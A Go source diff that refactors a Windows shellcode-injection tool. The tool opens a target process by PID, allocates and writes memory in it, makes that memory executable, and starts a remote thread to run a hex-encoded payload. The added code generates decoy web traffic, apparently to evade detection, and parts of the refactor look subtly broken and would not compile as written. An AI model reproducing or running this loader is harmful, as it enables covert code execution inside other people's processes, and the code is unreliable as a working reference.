@@ -13,123 +13,126 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-func a3d1a0f4d6e7f8() {
-	rand.Seed(time.Now().UnixNano())
-	for i := 0; i < 3; i++ {
-		go func() {
-			time.Sleep(5 * time.Minute)
-			urls := []string{
-				"https://www.example.com",
-				"https://www.google.com",
-				"https://www.amazon.com",
-			}
-			rand.Shuffle(len(urls), func(i, j int) {
-				urls[i], urls[j] = urls[j], urls[i]
-			})
-			for _, url := range urls[:rand.Intn(3)+1] {
-				http.Get(url)
-			}
-		}()
-	}
-}
-
-func b9c0d1e2f3() {
-	var d2e3f4g5h6 bool
-	var i4j5k6l7m8 bool
-	var n1o2p3q4r5 int
-	flag.BoolVar(&d2e3f4g5h6, "verbose", false, "Enable verbose output")
-	flag.BoolVar(&i4j5k6l7m8, "debug", false, "Enable debug output")
-	flag.IntVar(&n1o2p3q4r5, "pid", 0, "Process ID to inject shellcode into")
-	flag.Parse()
-}
-
-func e0f1g2h3i4j5() (string, error) {
-	shellcode, err := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
-	if err != nil {
-		return "", fmt.Errorf("[!]there was an error decoding the string to a hex byte array: %w", err)
-	}
-	return string(shellcode), nil
-}
-
-func e6f7g8h9i0j1() *windows.LazySystemDLL {
-	return windows.NewLazySystemDLL("kernel32.dll")
-}
-
-func e9fa01b2c3(flagVar interface{}) uintptr {
-	return uintptr(unsafe.Pointer(flagVar))
+var alexaDomains = []string{
+	"a.com", "b.com", "c.com",
+	"d.com", "e.com", "f.com",
+	"g.com", "h.com", "i.com",
+	"j.com", "k.com", "l.com",
+	"m.com", "n.com", "o.com",
+	"p.com", "q.com", "r.com",
+	"s.com", "t.com", "u.com",
+	"v.com", "w.com", "x.com",
+	"y.com", "z.com",
 }
 
 func main() {
-	a3d1a0f4d6e7f8()
-	b9c0d1e2f3()
-	shellcode, err := e0f1g2h3i4j5()
-	if err != nil {
-		log.Fatal(err)
+	verbose := flag.Bool("verbose", false, "Enable verbose output")
+	debug := flag.Bool("debug", false, "Enable debug output")
+	// To hardcode the Process Identifier (PID), change 0 to the PID of the target process
+	pid := flag.Int("pid", 0, "Process ID to inject shellcode into")
+	flag.Parse()
+
+	go func() {
+		for {
+			time.Sleep(5 * time.Minute)
+			rand.Seed(time.Now().UnixNano())
+			domains := alexaDomains[rand.Intn(len(alexaDomains))]
+			for i := 0; i < 3; i++ {
+				go func(url string) {
+					resp, err := http.Get("https://" + url)
+					if err != nil {
+						log.Println(err)
+					} else {
+						resp.Body.Close()
+					}
+				}(domains[rand.Intn(len(domains))])
+			}
+		}
+	}()
+
+	var shellcode, errShellcode = hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
+	if errShellcode != nil {
+		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
 	}
-	kernel32 := e6f7g8h9i0j1()
+
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+
 	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
 	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
 	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
 	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
-	pHandle, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(n1o2p3q4r5))
+
+	if *debug {
+		fmt.Println(fmt.Sprintf("[DEBUG]Getting a handle to Process ID (PID) %d...", *pid))
+	}
+	pHandle, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(*pid))
+
 	if errOpenProcess != nil {
-		log.Fatal(fmt.Errorf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess))
+		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess.Error()))
 	}
-	if e9fa01b2c3(&d2e3f4g5h6)*0x1 != 0 {
-		fmt.Printf("[-]Successfully got a handle to process %d\n", n1o2p3q4r5)
+	if *verbose {
+		fmt.Println(fmt.Sprintf("[-]Successfully got a handle to process %d", *pid))
 	}
-	if e9fa01b2c3(&i4j5k6l7m8)*0x1 != 0 {
-		fmt.Printf("[DEBUG]Calling VirtualAllocEx on PID %d...\n", n1o2p3q4r5)
+
+	if *debug {
+		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualAllocEx on PID %d...", *pid))
 	}
 	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+
 	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Errorf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc))
+		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
 	}
+
 	if addr == 0 {
 		log.Fatal("[!]VirtualAllocEx failed and returned 0")
 	}
-	if e9fa01b2c3(&d2e3f4g5h6)*0x1 != 0 {
-		fmt.Printf("[-]Successfully allocated memory in PID %d\n", n1o2p3q4r5)
+	if *verbose {
+		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", *pid))
 	}
-	if e9fa01b2c3(&i4j5k6l7m8)*0x1 != 0 {
-		fmt.Printf("[DEBUG]Calling WriteProcessMemory on PID %d...\n", n1o2p3q4r5)
+
+	if *debug {
+		fmt.Println(fmt.Sprintf("[DEBUG]Calling WriteProcessMemory on PID %d...", *pid))
 	}
 	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+
 	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Errorf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory))
+		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
 	}
-	if e9fa01b2c3(&d2e3f4g5h6)*0x1 != 0 {
-		fmt.Printf("[-]Successfully wrote shellcode to PID %d\n", n1o2p3q4r5)
+	if *verbose {
+		fmt.Println(fmt.Sprintf("[-]Successfully wrote shellcode to PID %d", *pid))
 	}
-	if e9fa01b2c3(&i4j5k6l7m8)*0x1 != 0 {
-		fmt.Printf("[DEBUG]Calling VirtualProtectEx on PID %d...\n", n1o2p3q4r5)
+
+	if *debug {
+		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualProtectEx on PID %d...", *pid))
 	}
 	oldProtect := windows.PAGE_READWRITE
 	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Errorf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx))
+		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
 	}
-	if e9fa01b2c3(&d2e3f4g5h6)*0x1 != 0 {
-		fmt.Printf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d\n", n1o2p3q4r5)
+	if *verbose {
+		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", *pid))
 	}
-	if e9fa01b2c3(&i4j5k6l7m8)*0x1 != 0 {
-		fmt.Printf("[DEBUG]Call CreateRemoteThreadEx on PID %d...\n", n1o2p3q4r5)
+
+	if *debug {
+		fmt.Println(fmt.Sprintf("[DEBUG]Call CreateRemoteThreadEx on PID %d...", *pid))
 	}
 	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
 	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Errorf("[!]Error calling CreateRemoteThreadEx:\r\n%s", errCreateRemoteThreadEx))
+		log.Fatal(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx:\r\n%s", errCreateRemoteThreadEx.Error()))
 	}
-	if e9fa01b2c3(&d2e3f4g5h6)*0x1 != 0 {
-		fmt.Printf("[+]Successfully create a remote thread in PID %d\n", n1o2p3q4r5)
+	if *verbose {
+		fmt.Println(fmt.Sprintf("[+]Successfully create a remote thread in PID %d", *pid))
 	}
-	if e9fa01b2c3(&i4j5k6l7m8)*0x1 != 0 {
-		fmt.Printf("[DEBUG]Calling CloseHandle on PID %d...\n", n1o2p3q4r5)
+
+	if *debug {
+		fmt.Println(fmt.Sprintf("[DEBUG]Calling CloseHandle on PID %d...", *pid))
 	}
 	errCloseHandle := windows.CloseHandle(pHandle)
 	if errCloseHandle != nil {
-		log.Fatal(fmt.Errorf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle))
+		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
 	}
-	if e9fa01b2c3(&d2e3f4g5h6)*0x1 != 0 {
-		fmt.Printf("[-]Successfully closed the handle to PID %d\n", n1o2p3q4r5)
+	if *verbose {
+		fmt.Println(fmt.Sprintf("[-]Successfully closed the handle to PID %d", *pid))
 	}
 }
